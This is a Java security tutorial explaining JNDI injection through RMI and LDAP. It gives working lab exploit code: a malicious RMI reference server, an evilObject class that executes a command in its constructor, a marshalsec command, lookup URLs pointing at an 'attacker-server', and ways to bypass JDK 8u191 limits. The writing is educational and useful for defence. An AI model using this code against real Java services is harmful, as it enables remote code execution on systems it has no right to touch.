# Java Security Learning—JNDI Injection

Author: H3rmesk1t

# JNDI
## Introduction
`JNDI`(Java Naming Directory Interface) is an API for accessing command and directory services provided by `Java`. The naming service links names and objects, so that objects can be accessed from names, [official link](https://docs.oracle.com/javase/tutorial/jndi/overview/index.html).

![JNDI](./images/1.gif)

`JNDI` is included in the Java SE` platform. To use `JNDI`, you must have the `JNDI` class and one or more service providers. `JDK` includes the service providers of the following named or directory services:
 - DNS: Domain Name Service (domain name service)
 - RMI: Java Remote Method Invocation (Java method remote call)
 - LDAP: Lightweight Directory Access Protocol (lightweight directory access protocol)
 - CORBA: Common Object Request Broker Architecture

The `JNDI` interface is mainly divided into `5` packages, the most important of which is the `javax.naming` package, which contains the classes and interfaces required to access directory services, such as `Context`, `Bindings`, `References`, `lookup`, etc.:
 - javax.naming
 - javax.naming.spi
 - javax.naming.ldap
 - javax.naming.event
 - javax.naming.directory

![javax.naming](./images/1.png)

## Sample Code
Here we better understand `JNDI` by implementing a simple example.

 - Demo.java

```java
package org.h3rmesk1t.jndi.demo;

import java.rmi.Remote;
import java.rmi.RemoteException;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/4 11:12 am
 */
public interface Demo extends Remote {

    public String Demo(String name) throws RemoteException;
}
```

 - DemoImpl.java

```java
package org.h3rmesk1t.jndi.demo;

import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/4 11:12 am
 */
public class DemoImpl extends UnicastRemoteObject implements Demo {
    
    protected DemoImpl() throws RemoteException {
        super();
    }
    
    public String Demo(String name) throws RemoteException {
        return "Hello, " + name;
    }
}
```

 - CallService.java

```java
package org.h3rmesk1t.jndi.demo;

import javax.naming.Context;
import javax.naming.InitialContext;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Properties;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/4 11:13 am
 */
public class CallService {

    public static void main(String[] args) throws Exception {

        // Initialize the default environment
        Properties env = new Properties();
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://localhost:1099");
        Context context = new InitialContext(env);

        // Create a registration center
        Registry registry = LocateRegistry.createRegistry(1099);
        Demo demo = new DemoImpl();
        registry.bind("demo", demo);

        // Find data
        Demo rDemo = (Demo) context.lookup("demo");
        System.out.println(rDemo.Demo("h3rmesk1t"));
    }
}
```

![JNDI-Demo](./images/2.png)

# SPI
Several Service Providers are built in the `JDK, namely `RMI`, `LDAP` and `CORBA`. However, these services themselves have no direct dependencies with `JNDI`, but are connected through the `SPI` interface.

## RMI
`RMI`(Remote Method Invocation), that is, `Java` remote method call, provides an interface for remote calling for applications. A simple `RMI` is mainly composed of three parts, namely the interface, the server and the client. For details, please see the [Java Security - RMI Learning] of the analysis between [Java Security - RMI Learning](https://github.com/H3rmesk1t/Learning_summary/blob/main/2022-1-19/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0-RMI%E5%AD%A6%E4%B9%A0.md).

## LDAP
`LDAP`(Lightweight Directory Access Protocol), or the lightweight directory access protocol. It provides a mechanism for querying, browsing, searching and modifying Internet directory data. It runs on the `TCP/IP` protocol stack and is based on the `C/S` architecture.

`Java` objects also have multiple storage forms in the `LDAP` directory:
 - Java Serialization
 - JNDI Reference
 - Marshalled object
 - Remote Location

Common attribute definitions in LDAP are as follows:

```code
String X.500 AttributeType
------------------------------
CN commonName
L localityName
ST stateOrProvinceName
O organizationName
OU organizationalUnitName
C countryName
STREET streetAddress
DC domainComponent
UID userid
```

Among them, it is important to note:
 - `DC`: `Domain Component`, the part that makes up the domain name, for example, a record of the domain name `evilpan.com` can be represented as `dc=evilpan,dc=com`, defined step by step from right to left.
 - `DN`: `Distinguished Name`, defined step by step by step by step by series of properties (from right to left), representing the unique name of the specified object.

## CORBA
`CORBA` is a standard defined by `Object Management Group`(OMG). In the concept of distributed computing, `Object Request Broker`(ORB)) represents middleware used for remote calls in distributed environments. In fact, it is an early RPC standard. `ORB` is responsible for taking over calls and requesting the server on the client, receiving requests and returning the result. `CORBA` uses the interface definition language (IDL) to express the object's external interface. The compiled and generated `stub code` supports multiple languages ​​such as `Ada`, `C/C++`, `Java`, `COBOL` and other languages. Its calling structure is shown in the figure below:

![CORBA](./images/3.png)

A simple `CORBA` user program consists of three parts, namely `IDL`, client and server:
 - IDL

```javascript
module HelloApp
{
  interface H
ello
  {
  string saysHello();
  oneway void shutdown();
  };
};
```

- Server

```java
// HelloServer.java
import HelloApp.*;
import org.omg.CosNaming.*;
import org.omg.CosNaming.NamingContextPackage.*;
import org.omg.CORBA.*;
import org.omg.PortableServer.*;
import org.omg.PortableServer.POA;

import java.util.Properties;

class HelloImpl extends HelloPOA {
    
  public String saysHello() {
    return "Hello from server";
  }

  public void shutdown() {
      System.out.println("shutdown");
  }
}


public class HelloServer {

  public static void main(String args[]) {
    try{
      // create and initialize the ORB
      ORB orb = ORB.init(args, null);

      // get reference to rootpoa & activate the POAManager
      POA rootpoa = POAHelper.narrow(orb.resolve_initial_references("RootPOA"));
      rootpoa.the_POAManager().activate();

      // create servicet
      HelloImpl helloImpl = new HelloImpl();

      // get object reference from the service
      org.omg.CORBA.Object ref = rootpoa.servant_to_reference(helloImpl);
      Hello href = HelloHelper.narrow(ref);
          
      // get the root naming context
      // NameService invokes the name service
      org.omg.CORBA.Object objRef =
          orb.resolve_initial_references("NameService");
      // Use NamingContextExt which is part of the Interoperable
      // Naming Service (INS) specification.
      NamingContextExt ncRef = NamingContextExtHelper.narrow(objRef);

      // bind the Object Reference in Naming
      String name = "Hello";
      NameComponent path[] = ncRef.to_name( name );
      ncRef.rebind(path, href);

      System.out.println("HelloServer ready and waiting...");

      // wait for invocations from clients
      orb.run();
    }
        
      catch (Exception e) {
        System.err.println("ERROR: " + e);
        e.printStackTrace(System.out);
      }
          
      System.out.println("HelloServer Exiting...");
        
  }
}
```

 - Client

```java
import HelloApp.*;
import org.omg.CosNaming.*;
import org.omg.CosNaming.NamingContextPackage.*;
import org.omg.CORBA.*;

public class HelloClient
{
  static Hello helloImpl;

  public static void main(String args[])
    {
      try{
        // create and initialize the ORB
        ORB orb = ORB.init(args, null);

        // get the root naming context
        org.omg.CORBA.Object objRef =
            orb.resolve_initial_references("NameService");
        // Use NamingContextExt instead of NamingContext. This is
        // part of the Interoperable naming Service.
        NamingContextExt ncRef = NamingContextExtHelper.narrow(objRef);
 
        // resolve the Object Reference in Naming
        String name = "Hello";
        helloImpl = HelloHelper.narrow(ncRef.resolve_str(name));

        System.out.println("Obtained a handle on server object: " + helloImpl);
        System.out.println(helloImpl.sayHello());

        helloImpl.shutdown();

        } catch (Exception e) {
          System.out.println("ERROR : " + e) ​​;
          e.printStackTrace(System.out);
        }
    }

}
```

# Dynamic protocol conversion
In the above example code, the factory of the corresponding service and the `PROVIDER_URL` of the corresponding service are manually set. In fact, dynamic protocol conversion can be performed in `JNDI`. The example code is as follows:

 - Demo-1
```java
Context context = new InitialContext();
context.lookup("rmi://attacker-server/refObject");
context.lookup("ldap://attacker-server/cn=bar,dc=test,dc=org");
context.lookup("iiop://attacker-server/bar");
```

 - Demo-2
```java
Hashtable env = new Hashtable();
env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
env.put(Context.PROVIDER_URL, "rmi://localhost:8888");
Context context = new InitialContext(env);

String name = "ldap://attacker-server/cn=bar,dc=test,dc=org";
context.lookup(name);
```

In the code of Demo-1, there is no factory with corresponding services and `PROVIDER_URL`, and `JNDI` automatically converts and sets the corresponding factory with corresponding services and `PROVIDER_URL` according to the passed URL protocol. In the code of Demo-2, it can be seen that even if the server sets the factory and `PROVIDER_URL` in advance, it has no effect. When the parameters during the `lookup operation can be controlled by the attacker, it will still dynamically convert based on the `URL` provided by the attacker and overwrite the initially set `PROVIDER_URL`, and point the `lookup operation to the server controlled by the attacker.

Let’s take a look at the specific process from the source code level and follow up on `InitialContext#lookup`
Method, the `InitialContext#getURLOrDefaultInitCtx` method will be called in the return value. Continue to follow up with the method, and dynamic conversion operations will be performed here.

![InitialContext#lookup](./images/4.png)

![InitialContext#getURLOrDefaultInitCtx](./images/5.png)

The `JNDI` automatic protocol conversion and corresponding factory classes supported by default in `JDK` are as follows:
|Protocol|schema|Context|
|:----|:----|:----|
|DNS|dns://|com.sun.jndi.url.dns.dnsURLContext|
|RMI|rmi://|com.sun.jndi.url.rmi.rmiURLContext|
|LDAP|ldap://|com.sun.jndi.url.ldap.ldapURLContext|
|LDAP|ldaps://|com.sun.jndi.url.ldaps.ldapsURLContext|
|IIOP|iiop://|com.sun.jndi.url.iiop.iiopURLContext|
|IIOP|iiopname://|com.sun.jndi.url.iiopname.iiopnameURLContext|
|IIOP|corbaname://|com.sun.jndi.url.corbaname.corbanameURLContext|

# Named Quotations
`JNDI` defines named references (Naming References), referred to as References. The general process is to bind a reference and store the object in a naming service or directory service. The name manager (Naming Manager) can resolve the reference to the associated original object. The reference is represented by the `Reference` class, which consists of an ordered list of the address (RefAddress) and the information of the referenced object. Each address contains information about how to construct the corresponding object, including the `Java` class name of the reference object, and the name and location of the `object factory` class used to create the object. `Reference` can be constructed using a factory. When using `lookup` to find the object, `Reference` will use the provided factory class loading address to load the factory class. The factory class will construct the required object and can load the factory class from the remote loading address. The sample code is as follows:

```java
Reference reference = new Reference("refClassName","FactoryClassName",FactoryURL);
ReferenceWrapper wrapper = new ReferenceWrapper(reference);
ctx.bind("refObj", wrapper);
```

When a client obtains a remote object through `lookup("refObj")`, a `Reference` reference class is obtained. The client will first go to the local `CLASSPATH` to find the class identified as `refClassName`. If it is not found locally, it will request `http://example.com:12345/FactoryClassName.class` to load the factory class.

For the attack of `JNDI`, the attack process can be summarized into the following figure:

![JNDI attack map](./images/6.png)

 - ①: The attacker provides LDAP/RMI URL for the lookup method of the vulnerable `JNDI`.
 - ②: The target server is connected to the remote `LDAP/RMI` server, and the `LDAP/RMI` server returns a malicious `JNDI` reference.
 - ③: The target server decodes the `JNDI` reference.
 - ④: Obtain the `Factory` class from the remote `LDAP/RMI` server.
 - ⑤: The target server instantiates the `Factory` class.
 - ⑥: Execute malicious `exploit`.

For JNDI injection, the default limit is imposed on both RMI/LDAP attack vectors in subsequent JDK versions:
 - JDK 5U45, 6U45, 7u21, 8u121 Start java.rmi.server.useCodebaseOnly The default configuration is true
 - JDK 6u132, 7u122, 8u113 Start com.sun.jndi.rmi.object.trustURLCodebase The default value is false
 - JDK 11.0.1, 8u191, 7u201, 6u211 com.sun.jndi.ldap.object.trustURLCodebase defaults to false

![JNDI Limitation](./images/7.jpeg)

# Vulnerability Exploit
## RMI
The steps for `JNDI` injection through `RMI` are roughly:
 - The attacker constructs a malicious object, adds malicious code to its constructor, and uploads it to the server to wait for remote loading.
 - Construct a malicious RMI server, bind a ReferenceWrapper object, the ReferenceWrapper object is an encapsulation of a Reference object.
 - The Reference object contains a remote address, and the malicious object class can be loaded in the remote address.
 - JNDI will parse the Reference object during the lookup operation, and remotely loading the malicious object triggers exploit.

Let’s take a look at the constructor method in `javax.naming.Reference`:
 - className: The class name used when loading remotely.
 - classFactory: The name of the class that needs to be instantiated in the loaded class.
 - classFactoryLocation: The address that provides classes data can be file/ftp/http and other protocols.

```java
public Reference(String className, String factory, String factoryLocation) {
    this(className);
    classFactory = factory;
    classFactoryLocation = factoryLocation;
}
```

### Sample Code

 - JNDIClient.java

```java
package org.h3rmesk1t.jndi.RMIAttack;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/5 11:12 am
 */
public class JNDIClient {

    public static void main(String[] args) throws NamingException {

        String url = "rmi://127.0.0.1:1099/reference";
        Context ctx = new InitialContext();
        ctx.lookup(url);
    }
}
```

 - JNDIServer.java

```java
package org.h3rmesk1t.jndi.RMIAttack;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/7 6:09 am
 */
public class JNDIServer {

    public static void main(String[] args) throws Exception {

        String className = "evilObject";
        String factoryName = "evilObject";
        String factoryLocationURL = "http://127.0.0.1:4444/";

        Registry registry = LocateRegistry.createRegistry(1099);
        Reference reference = new Reference(className, factoryName, factoryLocationURL);
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        System.out.println("Binding 'referenceWrapper' to 'rmi://127.0.0.1:1099/reference'");
        registry.bind("reference", referenceWrapper);
    }
}
```

 - evilObject.jav
a

```java
import java.io.IOException;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/5 11:17 am
 */
public class evilObject {

    public evilObject() {
        try {
            Runtime.getRuntime().exec("open -a Calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
```

![JNDI-RMI](./images/8.png)

Running steps:
 - Compile malicious class files: `javac evilObject`
 - Start a service where the malicious class file is located: `python3 -m http.server 4444`
 - Run `JNDIServer`
 - Run `JNDIClient`

Notes:
 - `evilObject.java` and its compiled files are placed in other directories to avoid finding this class directly in the current directory to successfully implement command execution
 - The `evilObject.java` file cannot declare the package name. The `class` file function name compiled after declaration will be added with the package name, so it does not match.
 - Note that the `java` version is used, and the available `jdk` version must be met when reproducing

In addition to using code to build a `RMI` service, you can directly use the off-the-shelf tool `marshalsec` to start a `RMI` service:

```bash
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1:80/#testObject 7777
```

### Process Analysis
Set a breakpoint at the `GenericURLContext#lookup` method in the `JNDIClient.java` file.

![JNDIClient-lookup](./images/9.png)

Follow up on the `GenericURLContext#lookup` method and the `RegistryContext#lookup` method will be further called.

![GenericURLContext#lookup](./images/10.png)

Follow up on the `RegistryContext#lookup` method, here I get the `ReferenceWrapper_Stub` object by calling `this.registry.lookup` and pass the `this.decodeObject` method together with `reference`.

![RegistryContext#lookup](./images/11.png)

Follow up on the `RegistryContext#decodeObject` method to detect whether `var1` is an instance of `RemoteReference`. If yes, get the `Reference` object through the `getReference` method.

![RegistryContext#decodeObject](./images/12.png)

Continue to follow up with `NamingManager#getObjectInstance`, call the `getObjectFactoryFromReference` method. If there is a class that needs to be obtained locally, it will be used to obtain locally; if the class does not exist locally and can be obtained remotely, the class will be loaded remotely. After obtaining the class, the `newInstance` method will be called in the `return` return statement, which will trigger the class's constructor. Since we wrote the malicious statement at the constructor, it will be triggered to execute here.

![NamingManager#getObjectInstance](./images/13.png)

![NamingManager#getObjectFactoryFromReference](./images/14.png)

![Reproduction](./images/15.png)

### Call chain

```java
getObjectFactoryFromReference(Reference, String):163, NamingManager (javax.naming.spi), NamingManager.java
getObjectInstance(Object, Name, Context, Hashtable):319, NamingManager (javax.naming.spi), NamingManager.java
decodeObject(Remote, Name):464, RegistryContext (com.sun.jndi.rmi.registry), RegistryContext.java
lookup(Name):124, RegistryContext (com.sun.jndi.rmi.registry), RegistryContext.java
lookup(String):205, GenericURLContext (com.sun.jndi.toolkit.url), GenericURLContext.java
lookup(String):417, InitialContext (javax.naming), InitialContext.java
main(String[]):17, JNDIClient (jndi_test1), JNDIClient.java
```

![Call Chain](./images/16.png)

## LDAP
The LDAP service just changes the protocol name to ldap, and the analysis process is similar to `RMI`.

### Sample Code
 - JNDIClient

```java
package org.h3rmesk1t.jndi.LDAPAttack;

import javax.naming.InitialContext;
import javax.naming.NamingException;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/7 7:03 am
 */
public class JNDIClient {

    public static void main(String[] args) throws NamingException {

        new InitialContext().lookup("ldap://127.0.0.1:6666/evilObject");
    }
}
```

![JNDI-LDAP](./images/17.png)

### Process Analysis
Here we use `marshalsec` to start a `LDAP` service, and the breakpoint will also be at `lookup`. The previous steps are the same as `RMI`, and we directly analyze the different places behind them.

Follow up on the `GenericURLContext#lookup` method, further call the `PartialCompositeContext#lookup` method, and first call the `ComponentContext#p_lookup` method in the condition of the `for` loop.

![GenericURLContext#lookup](./images/18.png)

Follow up on the `ComponentContext#p_lookup` method. Since the value of `var4.getStatus()` is `2`, the `LdapCtx#c_lookup` method is further called.

![ComponentContext#p_lookup](./images/19.png)

Follow up on the `LdapCtx#c_lookup` method, just like the previous process of analyzing the `RMI`, follow up on the `Obj#decodeObject` method, there are several processing of serialized data in this method. For details, you can see this article on Security [JNDI with LDAP](https://www.anquanke.com/post/id/201181).

![LdapCtx#c_lookup](./images/20.png)

Go back to the previous step, follow up on the `DirectoryManager#getObjectInstance` method, then call the `getObjectFactoryFromReference` method, and then the same operation as in `RMI` is performed. To determine whether there is a class that needs to be obtained locally. If it does not exist, it will be loaded remotely. Calling the `newInstance` method in the `return` return statement will trigger the class construction method, thereby executing `exploit`.

![DirectoryManager#getObjectInstance](./images/21.png)

### Call chain

```java
getObjectFactoryFromReference(Reference, String):142, NamingManager (javax.naming.spi), NamingManager.java
getObjectInstance(Object, Name, Context, Hashtable, Attributes):189, DirectoryManager (javax.naming.spi), DirectoryManager.java
c_lookup(Name, Continuation):1085, LdapCtx (com.sun.jndi.
ldap), LdapCtx.java
p_lookup(Name, Continuation):542, ComponentContext (com.sun.jndi.toolkit.ctx), ComponentContext.java
lookup(Name):177, PartialCompositeContext (com.sun.jndi.toolkit.ctx), PartialCompositeContext.java
lookup(String):205, GenericURLContext (com.sun.jndi.toolkit.url), GenericURLContext.java
lookup(String):94, ldapURLContext (com.sun.jndi.url.ldap), ldapURLContext.java
lookup(String):417, InitialContext (javax.naming), InitialContext.java
main(String[]):14, JNDIClient (jndi_test1), JNDIClient.java
```

![LDAP call chain](./images/22.png)

# Bypass the limitations of JDK 8u191+ and other versions
Since the [jdk8u191-b02](http://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/rev/2db6890a9567#l1.33), a new limit for com.sun.jndi.ldap.object.trustURLCodebase` defaults to `false`. A new judgment read `trustURLCodebase` is added at the `decodeObject` method, and this value is `false` by default, so the remote `Reference` factory class cannot be loaded through `RMI` and `LDAP`.

![trustURLCodebase](./images/23.png)

The two ways to bypass are as follows:
 - Find a victim's local `CLASSPATH` class as a malicious `Reference Factory` factory class, and use this local `Factory` class to execute commands.
 - Use LDAP to directly return a malicious serialized object. `JNDI` injection will still deserialize the object, and use deserialization of `Gadget` to complete the command execution.

Both methods rely on the victim's local `CLASSPATH` environment, and the victim's local `Gadget` needs to be used for attacks.

# refer to
 - [Detailed explanation of JAVA JNDI injection knowledge](https://www.anquanke.com/post/id/205447)
 - [The Past and Present Life of JNDI Injection Vulnerability](https://evilpan.com/2021/12/13/jndi-injection/)
 - [Lesson: Overview of JNDI](https://docs.oracle.com/javase/tutorial/jndi/overview/index.html)
 - [HPE Security Fortify, Software Security Research](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf)